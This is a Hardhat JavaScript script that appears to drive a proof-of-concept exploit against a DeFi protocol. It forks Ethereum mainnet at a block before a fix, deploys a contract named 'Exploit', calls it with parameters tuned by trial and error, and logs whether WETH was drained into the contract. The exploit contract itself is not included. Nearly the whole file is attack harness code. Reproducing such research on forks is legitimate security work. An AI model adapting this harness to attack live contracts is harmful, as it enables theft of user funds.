const hre = require("hardhat");
async function main() {
  
  // We reset the local chain to a fork of mainnet
  // so that the state is always pristine.
  await hre.network.provider.request({
  method: "hardhat_reset",
  params: [{
    forking: {
      // Replace with your actual API URL
      jsonRpcUrl: "https://eth-mainnet.g.alchemy.com/v2/API"
      //,blockNumbeR: 12500000 // after fix
      ,blockNumber: 12350000 // before fix
      }
    }]
  })
  // We'll use this contract to check the WETH balance of the 
  // PoC contract.
  const WETH = await hre.ethers.getContractAt("IERC20",'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2');
  // Deploy the PoC contract.
  const Exploit = await hre.ethers.getContractFactory("Exploit");
  const exploit = await Exploit.deploy();
  console.log("Exploit deployed to:", exploit.address);
  // Let's run the exploit PoC!
  const balance0 = await WETH.balanceOf(exploit.address);
  console.log("Balance before exploit",balance0/1e18,"ETH");
  console.log("starting exploit");
  // I had a bit of trouble finding the optimal values using the
  // the Python script, values didn't seem to work.
  // Found these parameters by trial and error.
  d = "207569000000000000000000"
  b = "092430000000000000000000"
  await exploit.start(d, b);
  const balance1 = await WETH.balanceOf(exploit.address);
  console.log("If the balance is positive the exploit worked!");
  console.log("Balance after exploit",balance1/1e18,"ETH");
}
main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error);
    process.exit(1);
  });
